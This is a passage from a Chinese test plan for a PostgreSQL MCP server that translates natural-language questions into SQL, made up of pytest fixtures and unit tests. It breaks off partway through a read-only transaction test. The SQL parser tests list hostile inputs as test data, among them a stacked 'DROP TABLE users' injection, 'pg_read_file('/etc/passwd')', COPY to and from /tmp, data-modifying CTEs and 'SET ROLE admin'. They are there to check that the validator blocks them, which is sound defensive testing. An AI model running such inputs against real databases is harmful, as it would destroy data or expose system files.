# PostgreSQL MCP Server 测试计划

**版本**: 1.1
**日期**: 2026-01-11
**状态**: 已审核修订
**关联文档**:
- [0002-pg-mcp-design.md](./0002-pg-mcp-design.md)
- [0004-pg-mcp-impl-plan.md](./0004-pg-mcp-impl-plan.md)

---

## 1. 测试策略概述

### 1.1 测试目标

1. **功能正确性**: 验证所有功能按设计文档要求正常工作
2. **安全性保障**: 确保 SQL 注入防护和深度防御机制有效
3. **性能基准**: 验证查询性能和连接池管理符合预期
4. **可靠性**: 验证错误处理、重试机制和资源清理正确工作

### 1.2 测试层次

```
┌────────────────────────────────────────────────────────────────┐
│                     E2E Tests (端到端测试)                      │
│   testcontainers + real PostgreSQL + mock OpenAI               │
├────────────────────────────────────────────────────────────────┤
│                   Integration Tests (集成测试)                  │
│   组件间交互测试、MCP 协议测试                                   │
├────────────────────────────────────────────────────────────────┤
│                     Unit Tests (单元测试)                       │
│   各模块独立测试、mock 依赖                                      │
├────────────────────────────────────────────────────────────────┤
│                   Security Tests (安全测试)                     │
│   SQL 注入防护、深度防御验证                                     │
└────────────────────────────────────────────────────────────────┘
```

### 1.3 测试工具链

| 工具 | 版本 | 用途 |
|------|------|------|
| pytest | >= 8.0.0 | 测试框架 |
| pytest-asyncio | >= 0.24.0 | 异步测试支持 |
| pytest-cov | >= 6.0.0 | 代码覆盖率 |
| testcontainers | >= 4.0.0 | PostgreSQL 容器化测试 |
| pytest-mock | >= 3.12.0 | Mock 支持 |
| hypothesis | >= 6.0.0 | 属性测试/模糊测试 |
| pytest-xdist | >= 3.5.0 | 测试并行执行 |
| pytest-rerunfailures | >= 13.0 | 失败重试 |
| faker | >= 22.0.0 | 测试数据生成 |
| bandit | >= 1.7.0 | 安全代码扫描 |
| pip-audit | >= 2.7.0 | 依赖漏洞检查 |

### 1.4 覆盖率目标

| 模块 | 目标覆盖率 | 关键性 |
|------|-----------|--------|
| sql_parser | >= 95% | 高 |
| query_service | >= 90% | 高 |
| database | >= 90% | 高 |
| schema_cache | >= 85% | 中 |
| config | >= 90% | 中 |
| rate_limiter | >= 85% | 中 |
| openai_client | >= 80% | 中 |
| **安全测试** | **100%** | **极高** |
| **总体** | **>= 85%** | - |

---

## 2. 测试环境配置

### 2.1 测试目录结构

```
tests/
├── __init__.py
├── conftest.py                    # 全局 Fixtures
├── pytest.ini                     # pytest 配置
├── unit/                          # 单元测试
│   ├── __init__.py
│   ├── test_models.py             # 数据模型测试
│   ├── test_config.py             # 配置模块测试
│   ├── test_sql_parser.py         # SQL 解析器测试
│   ├── test_database.py           # 数据库连接池测试
│   ├── test_schema_cache.py       # Schema 缓存测试
│   ├── test_openai_client.py      # OpenAI 客户端测试
│   ├── test_rate_limiter.py       # 速率限制器测试
│   ├── test_query_service.py      # 查询服务测试
│   └── test_logging.py            # 日志测试 (M-5)
├── integration/                   # 集成测试
│   ├── __init__.py
│   ├── test_mcp_server.py         # MCP 服务器测试
│   ├── test_query_flow.py         # 查询流程测试
│   └── test_concurrency.py        # 并发测试 (H-2)
├── security/                      # 安全测试
│   ├── __init__.py
│   ├── test_sql_injection.py      # SQL 注入防护测试
│   ├── test_readonly_transaction.py  # 只读事务测试
│   ├── test_defense_in_depth.py   # 深度防御测试
│   └── test_sql_fuzzing.py        # SQL 模糊测试 (M-4)
├── performance/                   # 性能测试 (H-3)
│   ├── __init__.py
│   └── test_performance.py        # 性能基准测试
├── e2e/                           # 端到端测试
│   ├── __init__.py
│   └── test_full_flow.py          # 完整流程测试
└── fixtures/                      # 测试数据
    ├── __init__.py
    ├── sample_schemas.py          # 示例 Schema
    ├── sql_samples.py             # SQL 样例
    ├── mock_responses.py          # Mock 响应
    └── factories.py               # 测试数据工厂 (L-4)
```

### 2.2 pytest.ini 配置 (L-2)

```ini
# tests/pytest.ini

[pytest]
asyncio_mode = auto
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*

# 测试标记定义
markers =
    slow: marks tests as slow (deselect with '-m "not slow"')
    security: marks tests as security-related
    integration: marks tests as integration tests
    e2e: marks tests as end-to-end tests
    performance: marks tests as performance tests

# 并行运行配置
addopts = -v --tb=short

# 超时配置
timeout = 60
```

### 2.3 覆盖率配置 (L-3)

在 `pyproject.toml` 中添加:

```toml
[tool.coverage.run]
source = ["src/pg_mcp"]
branch = true
omit = [
    "*/tests/*",
    "*/__pycache__/*",
    "*/conftest.py",
    "*/__main__.py",
]

[tool.coverage.report]
exclude_lines = [
    "pragma: no cover",
    "if TYPE_CHECKING:",
    "raise NotImplementedError",
    "if __name__ == .__main__.:",
    "@abstractmethod",
]
show_missing = true
fail_under = 85
```

### 2.4 conftest.py 核心 Fixtures

```python
# tests/conftest.py

import asyncio
import os
import uuid
from typing import AsyncGenerator, Generator

import pytest
import pytest_asyncio
from testcontainers.postgres import PostgresContainer

from pg_mcp.config.models import (
    AppConfig, DatabaseConfig, OpenAIConfig,
    ServerConfig, RateLimitConfig, SSLMode
)
from pg_mcp.infrastructure.database import DatabasePool, DatabasePoolManager
from pg_mcp.infrastructure.sql_parser import SQLParser
from pg_mcp.infrastructure.schema_cache import SchemaCache, SchemaCacheManager
from pg_mcp.infrastructure.rate_limiter import RateLimiter


# ============== Event Loop ==============

@pytest.fixture(scope="session")
def event_loop() -> Generator[asyncio.AbstractEventLoop, None, None]:
    """创建会话级别的事件循环"""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


# ============== PostgreSQL Container ==============

@pytest.fixture(scope="session")
def postgres_container() -> Generator[PostgresContainer, None, None]:
    """启动 PostgreSQL 测试容器 (会话级别复用)"""
    with PostgresContainer("postgres:16-alpine") as postgres:
        yield postgres


@pytest.fixture(scope="session")
def postgres_dsn(postgres_container: PostgresContainer) -> str:
    """获取 PostgreSQL 连接字符串"""
    return postgres_container.get_connection_url()


# ============== Database Setup (M-1: 修复测试数据隔离) ==============

@pytest_asyncio.fixture(scope="function")
async def test_database(postgres_container: PostgresContainer) -> AsyncGenerator[DatabasePool, None]:
    """创建测试数据库连接池 (每个测试函数独立 schema，支持并行测试)"""
    # 使用唯一的 schema 名称避免并行测试冲突
    schema_name = f"test_{uuid.uuid4().hex[:8]}"

    config = DatabaseConfig(
        name="test_db",
        connection_string=postgres_container.get_connection_url(),
        ssl_mode=SSLMode.DISABLE,
        min_pool_size=1,
        max_pool_size=5,
    )

    pool = DatabasePool(config)
    await pool.initialize()

    # 在独立 schema 中创建测试表
    async with pool.acquire() as conn:
        await conn.execute(f"CREATE SCHEMA IF NOT EXISTS {schema_name}")
        await conn.execute(f"SET search_path TO {schema_name}")

        await conn.execute(f"""
            CREATE TYPE {schema_name}.user_status AS ENUM ('active', 'inactive', 'banned');

            CREATE TABLE {schema_name}.users (
                id SERIAL PRIMARY KEY,
                name VARCHAR(100) NOT NULL,
                email VARCHAR(255) UNIQUE NOT NULL,
                status {schema_name}.user_status DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE {schema_name}.orders (
                id SERIAL PRIMARY KEY,
                user_id INTEGER REFERENCES {schema_name}.users(id),
                amount DECIMAL(10, 2) NOT NULL,
                status VARCHAR(50) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE INDEX idx_users_status ON {schema_name}.users(status);
            CREATE INDEX idx_orders_user_id ON {schema_name}.orders(user_id);

            INSERT INTO {schema_name}.users (name, email, status) VALUES
                ('Alice', 'alice@example.com', 'active'),
                ('Bob', 'bob@example.com', 'active'),
                ('Charlie', 'charlie@example.com', 'inactive');

            INSERT INTO {schema_name}.orders (user_id, amount, status) VALUES
                (1, 100.00, 'completed'),
                (1, 50.00, 'pending'),
                (2, 200.00, 'completed');
        """)

    # 设置连接默认 search_path
    pool._schema_name = schema_name

    yield pool

    # 清理: 删除整个 schema
    async with pool.acquire() as conn:
        await conn.execute(f"DROP SCHEMA IF EXISTS {schema_name} CASCADE")
    await pool.close()


# ============== SQL Parser ==============

@pytest.fixture
def sql_parser() -> SQLParser:
    """创建 SQL 解析器实例"""
    return SQLParser(dialect="postgres")


# ============== Configuration ==============

@pytest.fixture
def test_config(postgres_container: PostgresContainer) -> AppConfig:
    """创建测试配置"""
    return AppConfig(
        databases=[
            DatabaseConfig(
                name="test_db",
                connection_string=postgres_container.get_connection_url(),
                ssl_mode=SSLMode.DISABLE,
            )
        ],
        openai=OpenAIConfig(
            api_key="test-api-key",  # Mock 使用
            model="gpt-4o-mini",
        ),
        server=ServerConfig(
            cache_refresh_interval=3600,
            max_result_rows=100,
            query_timeout=30.0,
            rate_limit=RateLimitConfig(enabled=False),
        ),
    )


# ============== Rate Limiter ==============

@pytest.fixture
def rate_limiter() -> RateLimiter:
    """创建速率限制器"""
    config = RateLimitConfig(
        enabled=True,
        requests_per_minute=10,
        requests_per_hour=100,
        openai_tokens_per_minute=10000,
    )
    return RateLimiter(config)


# ============== Mock OpenAI ==============

@pytest.fixture
def mock_openai_response():
    """Mock OpenAI 响应"""
    def _create_response(sql: str, tokens: int = 100):
        return {
            "choices": [
                {
                    "message": {
                        "content": sql
                    }
                }
            ],
            "usage": {
                "total_tokens": tokens
            }
        }
    return _create_response
```

### 2.3 运行测试命令

```bash
# 运行所有测试
uv run pytest

# 运行特定测试模块
uv run pytest tests/unit/test_sql_parser.py -v

# 运行安全测试
uv run pytest tests/security/ -v

# 运行并生成覆盖率报告
uv run pytest --cov=src/pg_mcp --cov-report=html --cov-report=term

# 仅运行快速单元测试 (不含 testcontainers)
uv run pytest tests/unit/ -m "not slow"

# 并行运行测试
uv run pytest -n auto

# 运行失败重试
uv run pytest --reruns 3 --reruns-delay 1
```

---

## 3. 单元测试用例

### 3.1 数据模型测试 (test_models.py)

```python
# tests/unit/test_models.py

import pytest
from pydantic import ValidationError

from pg_mcp.models.errors import (
    ErrorCode, ErrorResponse, PgMcpError,
    UnknownDatabaseError, UnsafeSQLError
)
from pg_mcp.models.query import (
    ReturnType, QueryRequest, QueryResult, QueryResponse,
    SQLValidationResult
)


class TestErrorModels:
    """错误模型测试"""

    def test_error_code_enum_values(self):
        """验证所有错误码存在"""
        expected_codes = [
            "UNKNOWN_DATABASE", "AMBIGUOUS_QUERY", "UNSAFE_SQL",
            "SYNTAX_ERROR", "EXECUTION_TIMEOUT", "CONNECTION_ERROR",
            "OPENAI_ERROR", "RESULT_TOO_LARGE", "VALIDATION_ERROR",
            "RATE_LIMIT_EXCEEDED", "INTERNAL_ERROR"
        ]
        for code in expected_codes:
            assert hasattr(ErrorCode, code)

    def test_error_response_creation(self):
        """测试错误响应创建"""
        response = ErrorResponse(
            error_code=ErrorCode.UNSAFE_SQL,
            error_message="Test error"
        )
        assert response.success is False
        assert response.error_code == ErrorCode.UNSAFE_SQL

    def test_pg_mcp_error_to_response(self):
        """测试异常转响应"""
        error = PgMcpError(
            ErrorCode.SYNTAX_ERROR,
            "Invalid SQL",
            {"sql": "SELECT * FORM users"}
        )
        response = error.to_response()

        assert response.success is False
        assert response.error_code == ErrorCode.SYNTAX_ERROR
        assert response.error_message == "Invalid SQL"
        assert response.details == {"sql": "SELECT * FORM users"}

    def test_unknown_database_error(self):
        """测试未知数据库错误"""
        error = UnknownDatabaseError("prod", ["dev", "staging"])
        response = error.to_response()

        assert "prod" in response.error_message
        assert response.details["available_databases"] == ["dev", "staging"]

    def test_unsafe_sql_error(self):
        """测试不安全 SQL 错误"""
        error = UnsafeSQLError("Contains DROP statement")
        assert error.code == ErrorCode.UNSAFE_SQL
        assert "DROP" in error.message


class TestQueryModels:
    """查询模型测试"""

    def test_query_request_minimal(self):
        """测试最小查询请求"""
        request = QueryRequest(question="Show all users")

        assert request.question == "Show all users"
        assert request.database is None
        assert request.return_type == ReturnType.RESULT
        assert request.limit is None

    def test_query_request_full(self):
        """测试完整查询请求"""
        request = QueryRequest(
            question="Show top users",
            database="prod",
            return_type=ReturnType.BOTH,
            limit=100
        )

        assert request.database == "prod"
        assert request.return_type == ReturnType.BOTH
        assert request.limit == 100

    def test_query_request_validation_question_too_long(self):
        """测试问题过长验证"""
        with pytest.raises(ValidationError):
            QueryRequest(question="x" * 2001)

    def test_query_request_validation_question_empty(self):
        """测试问题为空验证"""
        with pytest.raises(ValidationError):
            QueryRequest(question="")

    def test_query_request_validation_limit_bounds(self):
        """测试 limit 边界验证"""
        # 有效边界
        QueryRequest(question="test", limit=1)
        QueryRequest(question="test", limit=10000)

        # 无效边界
        with pytest.raises(ValidationError):
            QueryRequest(question="test", limit=0)
        with pytest.raises(ValidationError):
            QueryRequest(question="test", limit=10001)

    def test_query_result(self):
        """测试查询结果"""
        result = QueryResult(
            columns=["id", "name"],
            rows=[[1, "Alice"], [2, "Bob"]],
            row_count=2,
            truncated=False
        )

        assert len(result.columns) == 2
        assert len(result.rows) == 2
        assert not result.truncated

    def test_sql_validation_result_valid(self):
        """测试有效 SQL 验证结果"""
        result = SQLValidationResult(
            is_valid=True,
            is_safe=True
        )
        assert result.is_valid
        assert result.is_safe
        assert result.error_message is None

    def test_sql_validation_result_invalid(self):
        """测试无效 SQL 验证结果"""
        result = SQLValidationResult(
            is_valid=False,
            is_safe=False,
            error_message="Syntax error"
        )
        assert not result.is_valid
        assert result.error_message == "Syntax error"
```

### 3.2 配置模块测试 (test_config.py)

```python
# tests/unit/test_config.py

import os
import pytest
from unittest.mock import patch

from pg_mcp.config.models import (
    SSLMode, DatabaseConfig, OpenAIConfig,
    RateLimitConfig, ServerConfig, AppConfig
)
from pg_mcp.config.loader import expand_env_vars, process_config_dict, load_config


class TestDatabaseConfig:
    """数据库配置测试"""

    def test_database_config_separate_params(self):
        """测试分离参数方式"""
        config = DatabaseConfig(
            name="mydb",
            host="localhost",
            port=5432,
            database="testdb",
            user="admin",
            password="secret123",
            ssl_mode=SSLMode.REQUIRE
        )

        dsn = config.get_dsn()
        assert "localhost" in dsn
        assert "5432" in dsn
        assert "testdb" in dsn
        assert "secret123" in dsn

    def test_database_config_connection_string(self):
        """测试连接字符串方式"""
        config = DatabaseConfig(
            name="mydb",
            connection_string="postgresql://user:pass@host:5432/db"
        )

        assert config.get_dsn() == "postgresql://user:pass@host:5432/db"

    def test_database_name_validation_valid(self):
        """测试有效数据库名"""
        valid_names = ["mydb", "my_db", "my-db", "DB123"]
        for name in valid_names:
            config = DatabaseConfig(name=name, connection_string="postgresql://x")
            assert config.name == name.lower()

    def test_database_name_validation_invalid(self):
        """测试无效数据库名"""
        invalid_names = ["my db", "my@db", "my.db"]
        for name in invalid_names:
            with pytest.raises(ValueError):
                DatabaseConfig(name=name, connection_string="postgresql://x")

    def test_pool_size_bounds(self):
        """测试连接池大小边界"""
        # 有效值
        config = DatabaseConfig(
            name="test",
            connection_string="postgresql://x",
            min_pool_size=1,
            max_pool_size=100
        )
        assert config.min_pool_size == 1

        # 无效值
        with pytest.raises(ValueError):
            DatabaseConfig(
                name="test",
                connection_string="postgresql://x",
                min_pool_size=0
            )


class TestOpenAIConfig:
    """OpenAI 配置测试"""

    def test_openai_config_defaults(self):
        """测试默认值"""
        config = OpenAIConfig(api_key="sk-xxx")

        assert config.model == "gpt-4o-mini"
        assert config.max_retries == 3
        assert config.timeout == 30.0

    def test_openai_config_custom(self):
        """测试自定义值"""
        config = OpenAIConfig(
            api_key="sk-xxx",
            model="gpt-4",
            base_url="https://custom.openai.com",
            max_retries=5,
            timeout=60.0
        )

        assert config.model == "gpt-4"
        assert config.base_url == "https://custom.openai.com"


class TestEnvVarExpansion:
    """环境变量展开测试"""

    def test_expand_single_var(self):
        """测试单个变量展开"""
        with patch.dict(os.environ, {"DB_HOST": "localhost"}):
            result = expand_env_vars("${DB_HOST}")
            assert result == "localhost"

    def test_expand_multiple_vars(self):
        """测试多个变量展开"""
        with patch.dict(os.environ, {"HOST": "localhost", "PORT": "5432"}):
            result = expand_env_vars("postgresql://${HOST}:${PORT}/db")
            assert result == "postgresql://localhost:5432/db"

    def test_expand_missing_var(self):
        """测试缺失变量保持原样"""
        result = expand_env_vars("${NONEXISTENT_VAR}")
        assert result == "${NONEXISTENT_VAR}"

    def test_process_config_dict_recursive(self):
        """测试递归处理配置字典"""
        with patch.dict(os.environ, {"HOST": "localhost", "KEY": "secret"}):
            data = {
                "database": {
                    "host": "${HOST}",
                    "nested": {
                        "api_key": "${KEY}"
                    }
                },
                "list": ["${HOST}", "static"]
            }
            result = process_config_dict(data)

            assert result["database"]["host"] == "localhost"
            assert result["database"]["nested"]["api_key"] == "secret"
            assert result["list"] == ["localhost", "static"]


# ============== M-3: 配置文件解析错误测试 ==============

class TestConfigLoader:
    """配置加载器测试 (M-3)"""

    def test_load_invalid_yaml(self, tmp_path):
        """测试无效 YAML 格式"""
        import yaml
        from pg_mcp.config.loader import load_config

        config_file = tmp_path / "config.yaml"
        config_file.write_text("invalid: yaml: content: [")

        with pytest.raises(yaml.YAMLError):
            load_config(str(config_file))

    def test_load_missing_required_field(self, tmp_path):
        """测试缺少必需字段"""
        from pydantic import ValidationError
        from pg_mcp.config.loader import load_config

        config_file = tmp_path / "config.yaml"
        config_file.write_text("""
databases:
  - name: test
    connection_string: postgresql://localhost/test
# 缺少 openai 配置
""")

        with pytest.raises(ValidationError) as exc_info:
            load_config(str(config_file))

        assert "openai" in str(exc_info.value).lower()

    def test_load_config_file_not_found(self):
        """测试配置文件不存在"""
        from pg_mcp.config.loader import load_config

        with pytest.raises(FileNotFoundError):
            load_config("/nonexistent/path/config.yaml")

    def test_load_invalid_database_config(self, tmp_path):
        """测试无效数据库配置"""
        from pydantic import ValidationError
        from pg_mcp.config.loader import load_config

        config_file = tmp_path / "config.yaml"
        config_file.write_text("""
databases:
  - name: "invalid name with spaces"
    connection_string: postgresql://localhost/test
openai:
  api_key: sk-test
""")

        with pytest.raises(ValidationError):
            load_config(str(config_file))

    def test_load_empty_config_file(self, tmp_path):
        """测试空配置文件"""
        from pg_mcp.config.loader import load_config

        config_file = tmp_path / "config.yaml"
        config_file.write_text("")

        with pytest.raises(Exception):  # 可能是 TypeError 或 ValidationError
            load_config(str(config_file))

    def test_load_valid_config(self, tmp_path):
        """测试有效配置文件"""
        from pg_mcp.config.loader import load_config

        config_file = tmp_path / "config.yaml"
        config_file.write_text("""
databases:
  - name: testdb
    connection_string: postgresql://user:pass@localhost:5432/db
openai:
  api_key: sk-test-key
server:
  max_result_rows: 500
""")

        config = load_config(str(config_file))

        assert config.databases[0].name == "testdb"
        assert config.server.max_result_rows == 500
```

### 3.3 SQL 解析器测试 (test_sql_parser.py)

```python
# tests/unit/test_sql_parser.py

import pytest
from pg_mcp.infrastructure.sql_parser import SQLParser, FORBIDDEN_FUNCTIONS, FORBIDDEN_KEYWORDS


class TestSQLParserValidation:
    """SQL 验证测试"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    # ============== 有效 SQL 测试 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users",
        "SELECT id, name FROM users WHERE status = 'active'",
        "SELECT u.name, COUNT(o.id) FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.name",
        "SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)",
        "WITH active_users AS (SELECT * FROM users WHERE status = 'active') SELECT * FROM active_users",
        "SELECT name, created_at::date FROM users",
        "SELECT COALESCE(name, 'Unknown') FROM users",
        "SELECT * FROM users ORDER BY created_at DESC LIMIT 10",
        "SELECT COUNT(*), AVG(amount) FROM orders GROUP BY user_id HAVING COUNT(*) > 1",
    ])
    def test_valid_select_queries(self, parser: SQLParser, sql: str):
        """测试有效的 SELECT 查询"""
        result = parser.validate(sql)
        assert result.is_valid, f"Expected valid SQL: {sql}"
        assert result.is_safe, f"Expected safe SQL: {sql}"

    # ============== 禁止的语句类型测试 ==============

    @pytest.mark.parametrize("sql,expected_type", [
        ("INSERT INTO users (name) VALUES ('test')", "Insert"),
        ("UPDATE users SET name = 'new' WHERE id = 1", "Update"),
        ("DELETE FROM users WHERE id = 1", "Delete"),
        ("DROP TABLE users", "Drop"),
        ("CREATE TABLE test (id INT)", "Create"),
        ("ALTER TABLE users ADD COLUMN age INT", "Alter"),
        ("TRUNCATE TABLE users", "Truncate"),
        ("GRANT SELECT ON users TO guest", "Grant"),
    ])
    def test_forbidden_statement_types(self, parser: SQLParser, sql: str, expected_type: str):
        """测试禁止的语句类型"""
        result = parser.validate(sql)
        assert result.is_valid  # 语法有效
        assert not result.is_safe  # 但不安全
        assert expected_type in (result.error_message or "")

    # ============== 禁止的函数测试 ==============

    @pytest.mark.parametrize("func", list(FORBIDDEN_FUNCTIONS))
    def test_forbidden_functions(self, parser: SQLParser, func: str):
        """测试禁止的危险函数"""
        sql = f"SELECT {func}(1)"
        result = parser.validate(sql)
        assert not result.is_safe, f"Function {func} should be blocked"
        assert func in (result.error_message or "").lower()

    # ============== 禁止的关键字测试 ==============

    @pytest.mark.parametrize("sql,keyword", [
        ("COPY users TO '/tmp/users.csv'", "COPY TO"),
        ("COPY users FROM '/tmp/users.csv'", "COPY FROM"),
        ("SELECT pg_read_file('/etc/passwd')", "PG_READ_FILE"),
    ])
    def test_forbidden_keywords(self, parser: SQLParser, sql: str, keyword: str):
        """测试禁止的关键字"""
        result = parser.validate(sql)
        assert not result.is_safe, f"Keyword '{keyword}' should be blocked"

    # ============== Stacked Queries 测试 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users; DROP TABLE users",
        "SELECT 1; SELECT 2",
        "SELECT * FROM users; INSERT INTO users (name) VALUES ('hacker')",
    ])
    def test_stacked_queries_blocked(self, parser: SQLParser, sql: str):
        """测试多语句攻击被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe
        assert "stacked queries" in (result.error_message or "").lower()

    # ============== CTE 安全性测试 ==============

    @pytest.mark.parametrize("sql", [
        "WITH deleted AS (DELETE FROM users RETURNING *) SELECT * FROM deleted",
        "WITH updated AS (UPDATE users SET name='x' RETURNING *) SELECT * FROM updated",
        "WITH inserted AS (INSERT INTO users (name) VALUES ('x') RETURNING *) SELECT * FROM inserted",
    ])
    def test_cte_with_modification_blocked(self, parser: SQLParser, sql: str):
        """测试 CTE 中的修改操作被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe
        assert "CTE" in (result.error_message or "")

    # ============== 子查询安全性测试 ==============

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users WHERE id = (SELECT 1; DROP TABLE users)",
        "SELECT (DELETE FROM users RETURNING id) FROM users",
    ])
    def test_subquery_injection_blocked(self, parser: SQLParser, sql: str):
        """测试子查询注入被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe

    # ============== SELECT 变体测试 (扩展规则) ==============

    @pytest.mark.parametrize("sql", [
        "SELECT * INTO new_table FROM users",
        "SELECT * FROM users FOR UPDATE",
        "SELECT * FROM users FOR SHARE",
        "SELECT * FROM users FOR NO KEY UPDATE",
        "SELECT * FROM users FOR KEY SHARE",
    ])
    def test_select_variants_blocked(self, parser: SQLParser, sql: str):
        """测试危险的 SELECT 变体被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"SELECT variant should be blocked: {sql}"

    # ============== 会话操作测试 ==============

    @pytest.mark.parametrize("sql", [
        "SET ROLE admin",
        "SET SESSION AUTHORIZATION admin",
        "RESET ROLE",
    ])
    def test_session_operations_blocked(self, parser: SQLParser, sql: str):
        """测试会话操作被阻止"""
        result = parser.validate(sql)
        assert not result.is_safe, f"Session operation should be blocked: {sql}"

    # ============== 语法错误测试 ==============

    @pytest.mark.parametrize("sql", [
        "SELEC * FROM users",
        "SELECT * FORM users",
        "SELECT * FROM",
        "SELECT",
    ])
    def test_syntax_errors(self, parser: SQLParser, sql: str):
        """测试语法错误检测"""
        result = parser.validate(sql)
        assert not result.is_valid


class TestSQLParserLimitHandling:
    """LIMIT 处理测试"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    def test_add_limit_to_query_without_limit(self, parser: SQLParser):
        """测试添加 LIMIT 到无限制查询"""
        sql = "SELECT * FROM users"
        result = parser.add_limit(sql, 100)

        assert "LIMIT" in result.upper()
        assert "100" in result

    def test_preserve_smaller_existing_limit(self, parser: SQLParser):
        """测试保留更小的现有 LIMIT"""
        sql = "SELECT * FROM users LIMIT 50"
        result = parser.add_limit(sql, 100)

        assert "50" in result

    def test_override_larger_existing_limit(self, parser: SQLParser):
        """测试覆盖更大的现有 LIMIT"""
        sql = "SELECT * FROM users LIMIT 1000"
        result = parser.add_limit(sql, 100)

        assert "100" in result


class TestSQLParserFormatting:
    """SQL 格式化测试"""

    @pytest.fixture
    def parser(self) -> SQLParser:
        return SQLParser()

    def test_format_simple_query(self, parser: SQLParser):
        """测试简单查询格式化"""
        sql = "select * from users where id=1"
        result = parser.format_sql(sql)

        # 格式化后应该有大写关键字和换行
        assert "SELECT" in result or "select" in result.lower()

    def test_format_invalid_sql_returns_original(self, parser: SQLParser):
        """测试无效 SQL 返回原样"""
        sql = "INVALID SQL SYNTAX"
        result = parser.format_sql(sql)
        assert result == sql
```

### 3.4 数据库连接池测试 (test_database.py)

```python
# tests/unit/test_database.py

import pytest
import pytest_asyncio
from unittest.mock import AsyncMock, patch, MagicMock

from pg_mcp.config.models import DatabaseConfig, SSLMode
from pg_mcp.infrastructure.database import (
    DatabasePool, DatabasePoolManager, _get_ssl_context
)
from pg_mcp.models.errors import DatabaseConnectionError, UnknownDatabaseError


class TestSSLContext:
    """SSL 上下文测试"""

    def test_ssl_disable(self):
        """测试禁用 SSL"""
        result = _get_ssl_context(SSLMode.DISABLE)
        assert result is False

    def test_ssl_require(self):
        """测试必须 SSL"""
        result = _get_ssl_context(SSLMode.REQUIRE)
        assert result is not False
        # 应该是 SSLContext
        import ssl
        assert isinstance(result, ssl.SSLContext)

    def test_ssl_prefer(self):
        """测试优先 SSL"""
        result = _get_ssl_context(SSLMode.PREFER)
        import ssl
        assert isinstance(result, ssl.SSLContext)
        assert result.check_hostname is False


class TestDatabasePool:
    """数据库连接池测试"""

    @pytest.fixture
    def db_config(self) -> DatabaseConfig:
        return DatabaseConfig(
            name="test",
            connection_string="postgresql://user:pass@localhost:5432/testdb",
            ssl_mode=SSLMode.DISABLE,
            min_pool_size=2,
            max_pool_size=5
        )

    @pytest.mark.asyncio
    async def test_pool_initialization(self, test_database):
        """测试连接池初始化"""
        # test_database fixture 已经初始化了连接池
        stats = test_database.pool_stats

        assert stats["status"] == "active"
        assert stats["size"] >= 1

    @pytest.mark.asyncio
    async def test_pool_fetch(self, test_database):
        """测试查询执行"""
        rows = await test_database.fetch("SELECT 1 as value")

        assert len(rows) == 1
        assert rows[0]["value"] == 1

    @pytest.mark.asyncio
    async def test_pool_fetchrow(self, test_database):
        """测试单行查询"""
        row = await test_database.fetchrow("SELECT COUNT(*) as count FROM users")

        assert row is not None
        assert row["count"] == 3  # 根据 fixture 数据

    @pytest.mark.asyncio
    async def test_pool_health_check(self, test_database):
        """测试健康检查"""
        is_healthy, message = await test_database.health_check()

        assert is_healthy
        assert "OK" in message

    @pytest.mark.asyncio
    async def test_pool_context_manager(self, test_database):
        """测试连接上下文管理器"""
        async with test_database.acquire() as conn:
            result = await conn.fetchval("SELECT 1")
            assert result == 1

    @pytest.mark.asyncio
    async def test_pool_close(self, db_config):
        """测试连接池关闭"""
        pool = DatabasePool(db_config)
        # 不初始化直接关闭应该安全
        await pool.close()

        stats = pool.pool_stats
        assert stats["status"] == "not_initialized"


class TestDatabasePoolManager:
    """数据库连接池管理器测试"""

    @pytest.fixture
    def configs(self) -> list[DatabaseConfig]:
        return [
            DatabaseConfig(
                name="db1",
                connection_string="postgresql://localhost/db1",
                ssl_mode=SSLMode.DISABLE
            ),
            DatabaseConfig(
                name="db2",
                connection_string="postgresql://localhost/db2",
                ssl_mode=SSLMode.DISABLE
            ),
        ]

    def test_add_database(self, configs):
        """测试添加数据库"""
        manager = DatabasePoolManager()

        for config in configs:
            manager.add_database(config)

        assert manager.list_databases() == ["db1", "db2"]

    def test_get_pool_existing(self, configs):
        """测试获取存在的连接池"""
        manager = DatabasePoolManager()
        manager.add_database(configs[0])

        pool = manager.get_pool("db1")
        assert pool is not None

    def test_get_pool_nonexistent(self, configs):
        """测试获取不存在的连接池"""
        manager = DatabasePoolManager()
        manager.add_database(configs[0])

        with pytest.raises(UnknownDatabaseError) as exc_info:
            manager.get_pool("nonexistent")

        assert "nonexistent" in str(exc_info.value)
        assert "db1" in str(exc_info.value)

    def test_get_default_database_single(self, configs):
        """测试单数据库时的默认数据库"""
        manager = DatabasePoolManager()
        manager.add_database(configs[0])

        assert manager.get_default_database() == "db1"

    def test_get_default_database_multiple(self, configs):
        """测试多数据库时无默认数据库"""
        manager = DatabasePoolManager()
        for config in configs:
            manager.add_database(config)

        assert manager.get_default_database() is None


class TestReadOnlyTransaction:
    """只读事务测试"""

    @pytest.mark.asyncio
    async def test_readonly_transaction_allows_select(self, test_database):
        """测试只读事务允许 SELECT"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                rows = await conn.fetch("SELECT * FROM users")
                assert len(rows) > 0

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_insert(self, test_database):
        """测试只读事务阻止 INSERT"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute(
                        "INSERT INTO users (name, email) VALUES ('test', 'test@test.com')"
                    )
                assert "read-only" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_readonly_transaction_blocks_update(self, test_database):
        """测试只读事务阻止 UPDATE"""
        async with test_database.acquire() as conn:
            async with conn.transaction(readonly=True):
                with pytest.raises(Exception) as exc_info:
                    await conn.execute("UPDATE users SET name = 'hacked' WHERE id = 1")
